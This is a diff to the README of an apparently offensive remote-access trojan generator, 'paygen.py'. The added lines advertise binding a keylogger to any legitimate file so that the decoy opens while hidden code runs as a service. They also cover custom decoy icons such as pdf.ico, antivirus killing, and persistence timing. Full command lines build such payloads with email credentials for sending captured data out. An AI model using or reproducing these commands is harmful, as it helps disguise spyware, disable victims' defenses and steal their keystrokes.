@@ -45,6 +45,9 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 - [x] Function to Kill Antivirus on Victim PC and tries to disable the Security Center
 - [x] Awesome Colourful Interface to generate payload
 - [x] On Attacker Side: While Creating Payload, Script Automatically Detects Missing Dependencies & Installs Them
+- [x] Able to add custom Icon to evil file
+- [x] **Built-in Binder** which can bind Keylogger to **Any File** [.pdf, .txt, .exe etc], Running legitimate file on front end & evil codes in back-end as a service. 
+- [x] Checks for **Already Running Instance** on System, If running instance found, then only legitimate file is executed [**Multiple Instance Prohibiter**].
 
 ## Tested On
 [![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**
@@ -98,7 +101,15 @@ $ chmod +x paygen.py
 $ ./paygen.py  --help    or   python paygen.py --help
 
 # Making Payload/RAT
-$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+
+# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
+
+# Making Payload/RAT with Custom Time to become persistence
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 
+
+Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
 ## How To Use in Windows
@@ -121,7 +132,15 @@ $ python -m pip install -r requirements.txt
 $ python paygen.py --help
 
 # Making Payload/RAT
-$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
+
+# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
+
+# Making Payload/RAT binded with legitimate file [Any file .exe, .pdf, .txt etc]
+$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon/txt.ico --bind passwords.txt 
+
+Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
 ## Note:- Evil File will be saved inside dist/ folder, inside technowhorse/ folder
